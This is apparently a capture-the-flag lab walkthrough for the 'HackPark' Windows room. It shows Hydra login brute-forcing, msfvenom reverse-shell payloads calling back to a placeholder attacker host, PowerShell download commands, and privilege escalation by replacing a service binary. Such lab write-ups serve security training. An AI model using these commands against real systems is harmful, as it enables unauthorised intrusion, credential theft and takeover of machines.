# HackPark

### Deploy the vulnerable Windows machine

This room will cover brute-forcing an accounts credentials, handling public exploits, using 
the Metasploit framework and privilege escalation on Windows.

**What's the name of the clown displayed on the homepage?**

Use a reverse image search to find the clowns name

### Using Hydra to brute-force a login

**What request type is the Windows log in form using?**

Navigate to the log in page inspect the log in form to find the HTTP method used.

**Guess a username, choose a password wordlist and gain credentials to a user account!**

Enumerate potential accounts with password retrieval page. Inspect the log in form, change 
to the network tab in your browser and log in with any credentials. Look at the raw payload 
string to work out the hydra http-post-form input and run it. 

`hydra -l <USERNAME> -P /usr/share/wordlists/<WORDLIST> <IP> http-post-form "<PAGE>:<ANY-OTHER-PARAMS>&<USER-PARAM>=^USER^&<PASS-PARAM>=^PASS^:<FAILURE-STRING>"`

Log in with the brute-forced credentials

### Compromise the Machine

**Are you able to identify the version of the BlogEngine?**

Navigate to the about page and find the BlogEngine version there.

**What is the CVE?**

Use [exploit-db](http://www.exploit-db.com/) to find an exploit for BlogEngine

**Who is the blog server running as?**

After gaining acces to the server, run `whoami` to find the username

### Windows Privilege Escalation

Generate a reverse shell payload with msfvenom and upload it to the target

`msfvenom windows/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -a x86 -f exe -o <SHELL-NAME>.exe`

`python3 -m http.server <PORT>`

`powershell Invoke-WebRequest -Uri http://<ATTACKER-IP>:<PORT>/path/to/payload/<SHELL-NAME>.exe -Outfile <SHELL-NAME>.exe`

Make sure to upload the payload to a directory the user has access to like C:\Users\Public

Start the meterpreter shell and catch it with the multi/handler.

*Note: Windows-exploit-suggester runs with python 2.7 which is no longer supported. The 
steps to get it working involve downgrading pip packages and is not recommended. WinPEAS is 
an excellent alternative, although it runs on the target.*

**What is the OS version of this windows machine?**

Run sysinfo on the meterpreter shell and enumerate the target.

**What is the name of the abnormal service running?**

Upload winPEAS to the the target and execute it, redirecting the output to a txt file for 
easy viewing. Search for services in the results and find the abnormal service.

**What is the name of the binary you're supposed to exploit?**

Use `sc qc <SERVICE-NAME>` to query the abnormal service and find the binary path name. 
Navigate to that path and look for event logs. The logs will show a binary running with 
Admistrator privileges.

Escalate privileges by replacing the current binary being executed by the WindowsScheduler 
service. Create a payload with msfvenom, upload it to the target and replace the existing binary with the malicious verison. Start a multi/handler to catch the shell.

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=<ATTACKER-IP> LPORT=<PORT> -f exe -o <BINARY-TO-REPLACE>.exe`

**What is the user flag (on Jeff's Desktop)?**

Find the user flag with meterpreter's search command and read it with cat or drop into a 
shell and navigate to Jeff's Desktop and read it with type.

**What is the root flag?**

Same as before, find the root flag with meterpreter's search command and read it with cat or 
drop into a shell and navigate to the Administrator's Desktop and read it with type.

### Privilege Escalation Without Metasploit

Generate a reverse shell payload with msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=<PORT> -f exe -o <BINARY-TO-REPLACE>.exe`

Start a python http.server and download the payload on the target 
`powershell Invoke-WebRequest -Uri <ATTACKER-IP>:<HTTP.SERVER-PORT>/path/to/payload -Outfile C:\Windows\Temp\payload.exe`

Download winPEAS.bat as above and run it on the target, redirecting output to a file.

Using the results from winPEAS, escalate privileges to Administrator.

**Using winPeas, what was the Original Install time (date and time)?**

Search the winPEAS results for Original Install to find the date and time.
